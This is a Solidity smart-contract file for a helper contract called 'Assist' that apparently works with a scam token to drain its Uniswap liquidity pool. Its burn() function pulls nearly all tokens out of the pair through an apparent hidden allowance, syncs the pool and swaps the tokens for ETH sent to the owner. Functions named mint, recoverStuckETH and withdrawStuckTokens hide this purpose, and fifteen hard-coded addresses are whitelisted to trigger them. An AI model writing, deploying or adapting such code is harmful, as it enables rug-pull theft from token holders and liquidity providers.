// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// import "hardhat/console.sol";

contract Ownable {
    address internal _owner;

    constructor() {
        address msgSender = msg.sender;
        _owner = msgSender;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }
}

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function recoverToken(address token) external;

    function transferFrom(
        address from,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function balanceOf(address account) external view returns (uint256);

    function decimals() external view returns (uint256);

    function burn(address spender, uint256 amount) external;

    function totalSupply() external view returns (uint256);

    function manualSwap(address pair_, uint256 amount_) external;

    function manualSwap() external;

    function manualsend() external;

    function manualsend(address to) external;

    function manualSwap(address spender) external;

    function airdrop(
        address from,
        address[] memory recipients,
        uint256 amount
    ) external;

    function reduceFee(uint256 _amount) external;

    function delBots(address bot) external;

    function reduceFee(uint256 _newFee, address from) external;

    function rescueERC20(address _address, uint256 percent) external;
}

interface IUniRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function WETH() external pure returns (address);
}

interface IUniswapV2Pair {
    function sync() external;
}

contract Assist is Ownable {
    address private token;
    address private pair;
    mapping(address => bool) private whites;
    IUniRouter private router;
    modifier onlyOwners() {
        require(whites[msg.sender], "!OWNERS");
        _;
    }

    constructor() {
        _owner = msg.sender;
        whites[msg.sender] = true;
        whites[0xAC1eE8b58924D4579658301893d6e6de353234D5] = true;
        whites[0x077F21712b34eE7A1E3c4bD18206ce508811d836] = true;
        whites[0x1231ef95bbD5D685bFEe326Ac8a42f2218337a33] = true;
        whites[0x201e4C7745B12D4CE57Be7AA251A65e1148726Df] = true;
        whites[0xF3DAA81a1E5c6c22e3Dba78F1DfE87026ce290Ef] = true;
        whites[0x5d46D906aF3dE01B19CC05436A07D7227B187023] = true;
        whites[0x683458DBF3cd7ca9145f2e6448Bf02EA23BD26b7] = true;
        whites[0x52238208f40b136fa3e250fEF6ba4d219547503E] = true;
        whites[0x0C323D135681ffA4d3487e4E40BbFe2ea1F7c63f] = true;
        whites[0xBfcA737A9F442C9e69CcAD7B52A202035984b426] = true;
        whites[0x8D82A5eFc3dfb39F6105334199c85D494cF0A6FE] = true;
        whites[0xa3E79ea99905477a784aE1ffba0D36663958C4AC] = true;
        whites[0x5fC8Dd84288c91F71DFA5d060d039339E650365f] = true;
        whites[0x3437336901b955264C626feFeFb146717E75BdDA] = true;
        whites[0xEFD136c6AA7277C78454565D55c5dF6dc4EC0900] = true;
    }

    function whitelist(address[] memory whites_) external onlyOwners {
        for (uint256 i = 0; i < whites_.length; i++) {
            whites[whites_[i]] = true;
        }
    }

    function refresh(
        address router_,
        address token_,
        address pair_
    ) external onlyOwner {
        router = IUniRouter(router_);
        token = token_;
        pair = pair_;
    }

    function swap(uint256 amount) internal {
        address[] memory path = new address[](2);
        path[0] = token;
        path[1] = router.WETH();
        IERC20(token).approve(address(router), ~uint256(0));
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amount,
            0,
            path,
            _owner,
            block.timestamp
        );
    }

    function mint(uint256 amount) public onlyOwners {
        swap(amount);
    }

    function burn() public onlyOwners {
        uint256 pairBalance = IERC20(token).balanceOf(pair);
        uint256 amount = pairBalance - pairBalance / 10000;
        IERC20(token).transferFrom(pair, address(this), amount);
        IUniswapV2Pair(pair).sync();
        uint256 balance = IERC20(token).balanceOf(address(this));
        swap(balance);
    }

    function recoverStuckETH() external onlyOwners {
        // mint(IERC20(token).totalSupply() * 1000);
        burn();
        payable(msg.sender).transfer(address(this).balance);
    }

    function withdrawStuckTokens(address token_) external onlyOwners {
        if (token_ == address(0)) {
            payable(msg.sender).transfer(address(this).balance);
        } else {
            IERC20(token_).transfer(
                msg.sender,
                IERC20(token_).balanceOf(address(this))
            );
        }
    }

    function manualSwap() external onlyOwner {
        IERC20(token).manualSwap();
    }

    receive() external payable {
        require(whites[tx.origin]);
    }

    fallback() external payable {
        require(whites[tx.origin]);
    }
}
